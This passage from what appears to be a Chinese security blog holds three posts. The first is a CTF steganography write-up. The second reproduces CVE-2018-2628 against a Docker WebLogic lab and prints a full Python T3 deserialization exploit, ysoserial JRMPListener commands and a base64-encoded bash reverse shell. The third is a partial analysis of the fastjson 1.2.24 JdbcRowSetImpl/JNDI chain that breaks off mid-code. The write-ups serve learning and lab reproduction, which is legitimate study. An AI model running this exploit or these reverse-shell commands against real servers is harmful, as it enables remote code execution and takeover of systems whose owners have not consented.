<h5 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h5><p>下载zip又是一张图片，右键查看属性备注有一个新约佛论禅加密<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734749.png"><br>解密得到gemlove<br>在看题目提示<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734750.png"><br>猜测出题人使用了outguess工具隐写文件<br>工具下载：<a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a><br>下载源文件：git clone <a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a><br>kali下执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734751.png"><br>安装成功！！！（其实我挺害怕报错的=D）<br>使用命令：outguess -k ‘gemlove’ -r ./sheng_huo_zhao_zhao.jpg flag.txt<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734752.png"></p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h3><h4 id="⚫-“-gt-”这是brainfuck代码，使用在线执行网站运行即可得到明文"><a href="#⚫-“-gt-”这是brainfuck代码，使用在线执行网站运行即可得到明文" class="headerlink" title="⚫ “++.&gt;++++”这是brainfuck代码，使用在线执行网站运行即可得到明文"></a>⚫ “++.&gt;++++”这是brainfuck代码，使用<a href="http://bf.doleczek.pl/">在线执行网站</a>运行即可得到明文</h4><h4 id="⚫-emoji-加密在线网站key为emoji，或者网站https-github-com-mozilla-codemoji下载源码"><a href="#⚫-emoji-加密在线网站key为emoji，或者网站https-github-com-mozilla-codemoji下载源码" class="headerlink" title="⚫ emoji 加密在线网站key为emoji，或者网站https://github.com/mozilla/codemoji下载源码"></a>⚫ emoji 加密<a href="http://taqini.space/codemoji/#/encrypt">在线网站</a>key为emoji，或者网站<a href="https://github.com/mozilla/codemoji%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81">https://github.com/mozilla/codemoji下载源码</a></h4><h4 id="⚫-base64可以转图片"><a href="#⚫-base64可以转图片" class="headerlink" title="⚫ base64可以转图片"></a>⚫ base64可以转<a href="https://the-x.cn/base64">图片</a></h4><h4 id="⚫-ook也是一个加密密文-在线网站"><a href="#⚫-ook也是一个加密密文-在线网站" class="headerlink" title="⚫ ook也是一个加密密文,在线网站"></a>⚫ ook也是一个加密密文,<a href="https://www.splitbrain.org/services/ook">在线网站</a></h4><h4 id="⚫-“佛曰”为与佛论禅加密，”新佛曰”为新约佛论禅"><a href="#⚫-“佛曰”为与佛论禅加密，”新佛曰”为新约佛论禅" class="headerlink" title="⚫ “佛曰”为与佛论禅加密，”新佛曰”为新约佛论禅"></a>⚫ “佛曰”为<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a>加密，”新佛曰”为<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a></h4><h4 id="⚫-识别outguess和steghide隐写的方法：（待验证）”password”的密匙偏向于steghide-”key”的密匙偏向于outguess，主要看题目有没有提示工具的关键名字如：”guess”，”hide”"><a href="#⚫-识别outguess和steghide隐写的方法：（待验证）”password”的密匙偏向于steghide-”key”的密匙偏向于outguess，主要看题目有没有提示工具的关键名字如：”guess”，”hide”" class="headerlink" title="⚫ 识别outguess和steghide隐写的方法：（待验证）”password”的密匙偏向于steghide,”key”的密匙偏向于outguess，主要看题目有没有提示工具的关键名字如：”guess”，”hide”"></a>⚫ 识别outguess和steghide隐写的方法：（待验证）”password”的密匙偏向于steghide,”key”的密匙偏向于outguess，主要看题目有没有提示工具的关键名字如：”guess”，”hide”</h4><h4 id="⚫-another："><a href="#⚫-another：" class="headerlink" title="⚫ another："></a>⚫ another：</h4><p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734753.png"><br>隐写的还有一种JPG隐写的方法——使用jphhs05工具来载入数据<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734754.png"></p>
<p>end…</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2018-2628</title>
    <url>/2023/09/21/cve-2018-2628weblogic%20t3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="cve-2018-2628weblogic-t3反序列化复现"><a href="#cve-2018-2628weblogic-t3反序列化复现" class="headerlink" title="cve-2018-2628weblogic t3反序列化复现"></a>cve-2018-2628weblogic t3反序列化复现</h3><p>本篇只是脚本小子的复现，全是工具没有技术….</p>
<span id="more"></span>

<p>靶机docker-ip：172.xx.xx.2，<br>监听的ip：172.xx.xx.1:9999<br>开启JRMP Server的ip：192.xx.xx.xx和上面两个在一个网段<br>直接在vuln上面找到这个漏洞的目录，直接</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure>
<p>开启了访问下看看7001端口，然后看看开启成功没有，<br>ysoserial反序列化利用工具下载：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>然后就是开启下JRMP Server</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp ysoserial-<span class="number">0</span>.<span class="number">0</span>.<span class="number">6</span>-SNAPSHOT-BETA-<span class="literal">all</span>.jar ysoserial.exploit.JRMPListener<span class="meta"> [listen port] CommonsCollections1 [command]</span></span><br></pre></td></tr></table></figure>
<p>【listen port】是JRMP Server 监听的端口【Command】是想要执行命令<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309211729935.png"></p>
<p>然后就是py2的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># IMPORTANT: Is provided only for educational or information purposes.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Credit: Thanks by Liao Xinxi of NSFOCUS Security Team</span></span><br><span class="line"><span class="comment"># Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># How to exploit:</span></span><br><span class="line"><span class="comment"># 1. run below command on JRMPListener host</span></span><br><span class="line"><span class="comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span></span><br><span class="line"><span class="comment">#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span></span><br><span class="line"><span class="comment">#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;nc -nv 10.0.0.5 4040&#x27;</span></span><br><span class="line"><span class="comment"># 2. start a listener on attacker host</span></span><br><span class="line"><span class="comment">#    e.g. nc -nlvp 4040</span></span><br><span class="line"><span class="comment"># 3. run this script on attacker host</span></span><br><span class="line"><span class="comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span></span><br><span class="line"><span class="comment">#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span></span><br><span class="line"><span class="comment">#       e.g.</span></span><br><span class="line"><span class="comment">#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)</span></span><br><span class="line"><span class="comment">#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    <span class="comment">#generates ysoserial payload</span></span><br><span class="line">    command = <span class="string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;command: &quot;</span> + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(<span class="string">&#x27;payload.out&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(bin_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_handshake</span>(<span class="params">sock, server_addr</span>):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;handshake successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_t3_request_object</span>(<span class="params">sock, port</span>):</span><br><span class="line">    data1 = <span class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport))</span><br><span class="line">    data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">    data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_objdata</span>(<span class="params">sock, data</span>):</span><br><span class="line">    payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">65</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span> + payload)</span><br><span class="line">    rs=send_payload_objdata(sock, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;response: &#x27;</span> + rs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;exploit completed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#check for args, print usage if incorrect</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span></span><br><span class="line">              <span class="string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dport = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    path_ysoserial = sys.argv[<span class="number">3</span>]</span><br><span class="line">    jrmp_listener_ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">    jrmp_listener_port = sys.argv[<span class="number">5</span>]</span><br><span class="line">    jrmp_client = sys.argv[<span class="number">6</span>]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">            </span><br></pre></td></tr></table></figure>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309211729938.png"></p>
<p>脚本命令介绍<br>[victim ip] :目标IP<br>[victim port] : 目标端口<br>[path to ysoserial] ： ysoserial的路径<br>[JRMPListener ip] ： 攻击机器的IP，与监听的端口<br>[JRMPClient] ：使用的是JRMPClient类</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> exp.py <span class="number">172</span>.xx.xx.<span class="number">2</span> <span class="number">7001</span> ysoserial.jar <span class="number">172</span>.xx.x.<span class="number">1</span> <span class="number">1234</span> JRMPClient</span><br></pre></td></tr></table></figure>
<p>然后进入docker的bash看看是否执行创建命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> exec -ti cve-<span class="number">2018</span>-<span class="number">2628</span>_weblogic_1 /bin/bash</span><br></pre></td></tr></table></figure>
<p>后面的是容器名字<br>也可以执行反弹shell的操作，我们可以这样写命令</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">bash -c </span><span class="template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjIuMC4xLzk5OTkgMD4mMQ==&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure>
<p>这段base64解码就是bash -i &gt;&amp; /dev/tcp/172.22.0.1/9999 0&gt;&amp;1，后续渗透遇到什么复现失败的情况再更新原因</p>
]]></content>
      <tags>
        <tag>Java_nday</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson反序列化1.2.24分析</title>
    <url>/2023/09/22/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.2.24%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>瞎<span id="more"></span>jb分析一波</p>
<p>正常的反序列化一个类是这样子的<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221004280.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//String jsonString = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;name\&quot;:\&quot;John\&quot;,\&quot;age\&quot;:\&quot;30\&quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//JSONObject jsonObject = JSON.parseObject(jsonString);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;,\&quot;age\&quot;:\&quot;30\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(s, Person.class);</span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里我们新建了一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>  age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到我们Person类里面调用了什么方法就会输出该方法名字，在Main.java的里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(s, Person.class)</span><br></pre></td></tr></table></figure>
<p>实例化了我们的Person类把它进行了反序列化，而常见的反序列化是这样子的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;,\&quot;age\&quot;:\&quot;30\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
<p>能不能在常规的反序列化里面把字符串当成类处理扔到里面呢，当存在一个@type键值对的时候就会实现<br>把字符串当成类处理<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221005959.png"></p>
<p>其中为什么是@type是因为在这个里面读取了第一个键的传入key做了判断，然后TypeUtils.loadClass就会加载这个类然后放到缓存<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221005474.png"></p>
<p>然后稀里糊涂的看完了流程发现只有set方法是全局的可以利用的，get要满足下面几种条件才可以利用<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221006995.png"></p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221006428.png"></p>
<p>我们在看看setter方法怎么被调用的：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221006895.png"></p>
<p>调用了parseObject方法进行反序列化，并且指定了反序列化对象Person类，parseObject方法会将json数据反序列化成Person对象，并且在反序列化过程中调用了Person对象的setter方法。<br>然后再看看另外一种方法：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221007865.png"></p>
<p>调用了parse方法将json数据反序列化成java对象，并且在反序列化时调用了对象的setter方法，下一个方法：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221007081.png"></p>
<p>调用了parseObject方法将json数据反序列化成java对象，并且在反序列化过程中会调用对象的setter和getter方法，可以看到这几个反序列化都是会调用setter方法的，而只有parseObject方法会调用getter方法，就是说用parseObject方法都可以调用<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221007662.png"></p>
<p>当反序列化是这个parseObject方法的时候这两个恶意类都可以被执行(因为getter和setter都会被调用)<br>在做分析调试之前先做一点准备工作，下载对应自己的jdk源码文件以便调试和阅读:<a href="https://github.com/adoptium/jdk/releases/tag/jdk8-b65">https://github.com/adoptium/jdk/releases/tag/jdk8-b65</a>,<br>jdk下载：<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a><br>然后把jdk源码替换到需要替换的包，一般都是在安装jdk目录src里面(没解压需要解压)，对应路径，比如sun和com.sun包，里面加入java文件（因为class文件不容易调试），然后在idea项目结构里面sdk添加jdk的根目录下面的src目录就可以，调试会自动跳转到java文件。<br>开始调试…</p>
<h3 id="JdbcRowSetImpl链加JNDI注入"><a href="#JdbcRowSetImpl链加JNDI注入" class="headerlink" title="JdbcRowSetImpl链加JNDI注入"></a>JdbcRowSetImpl链加JNDI注入</h3><p>首先看这个链，这个链是最简单的链子，调用关键的两个方法 ：setDataSourceName()和setAutoCommit()，在fastjson中存在动态调用，我们传入name进去，他就会被调用getter方法，变成getName（）自动加上get然后首字母大写。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">           conn.setAutoCommit(autoCommit);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           conn = connect();</span><br><span class="line">           conn.setAutoCommit(autoCommit);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>如果conn为null就会调用connect方法，跟进看看connect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get a JDBC connection.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// First check for Connection handle object as such if</span></span><br><span class="line">        <span class="comment">// &quot;this&quot; initialized  using conn.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> conn;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Connect using JNDI.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup</span><br><span class="line">                    (getDataSourceName());</span><br><span class="line">                <span class="comment">//return ds.getConnection(getUsername(),getPassword());</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(getUsername() != <span class="literal">null</span> &amp;&amp; 